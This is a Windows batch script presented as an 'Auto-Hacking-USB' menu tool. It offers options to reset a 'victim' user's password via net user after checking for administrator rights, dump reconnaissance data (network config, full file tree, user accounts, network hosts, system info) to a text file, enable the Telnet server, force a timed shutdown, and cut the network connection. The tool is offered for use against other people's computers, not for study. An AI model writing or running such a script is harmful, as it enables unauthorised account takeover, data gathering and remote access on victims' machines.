@echo off
:starthere
echo What would you like to do today?
echo 0) Removes user password
echo 1) Get info about the computer. Stored under System_Info.txt
echo 2) Turn on telnet (GREAT for lan connection from another computer)
echo 3) Shutdown computer with message
echo 4) Disconnect from internet and make it hard to turn back on
echo 5) Reconnect to internet after hard disconnect
echo x) More stuff is coming soon! Look for the next update at https://github.com/rossepsteini/Auto-Hacking-USB
set /p choice=
if %choice% == 0 goto :cp
if %choice% == 1 goto :gi
if %choice% == 2 goto :et
if %choice% == 3 goto :swm
if %choice% == 4 goto :dci
if %choice% == 5 goto :rci
cls
:cp
echo ....
goto :check_Permissions
:cp1
net user
echo Which one of these is the victims user name?
set /p user=
echo What do you want to change the password to?
set /p pass=
net user %user% %pass%
echo The password for %user% has been changed to %pass% succefully!
pause
cls
goto :starthere
:gi
cls
echo Gettings tons of info from the computer. Will be stored in System_Info.txt
pause
echo IP Configuration: >> System_Info.txt
ipconfig /all >> System_Info.txt
echo Complete File Structure: >> System_Info.txt
tree /f >> System_Info.txt
echo All Users on computer: >> System_Info.txt
net user >> System_Info.txt
echo Computers connected to network: >> System_Info.txt
net view >> System_Info.txt
echo Hardware and other system info: >> System_Info.txt
systeminfo >> System_Info.txt
ping localhost -n 5>null
cls
goto :starthere
:et
pkgmgr /iu:”TelnetClient”
pkgmgr /iu:”TelnetServer”
echo Telnet now enabled.
ping localhost -n 2 >null
ipconfig
cls
goto :starthere
cls
:swm
echo How long would you like to wait until it shutdown?
set /p time=
echo Ok. What would you like the message to say?
set /p message=
shutdown -s -t %time% -c "%message%"
echo To abort do command shutdown -a
cls
goto :starthere
:dci
echo Disconnecting from the internet...
ipconfig /release *Con*
echo Making it hard to re-enabled
ping localhost -n 4 >null
echo Internet is no longer working to re enable choose option 5.
pause
cls
goto :starthere
:rci 
echo Reverting settings....
ping localhost -n 3 >null
echo Restarting adapter
ipconfig /renew
echo Internet has been reconnected
pause
cls
goto :starthere
:check_Permissions
cls
echo For this to work you have to run as administrator. Detecting Permissions...
ping localhost -n 4 >null
net session >nul 2>&1
if %errorLevel% == 0 (
	cls
	echo Success: Administrative permissions confirmed....
	goto :cp1
	) else (
		cls
		echo please close and re-open with administrative right.
	pause
	goto eos
	)
	

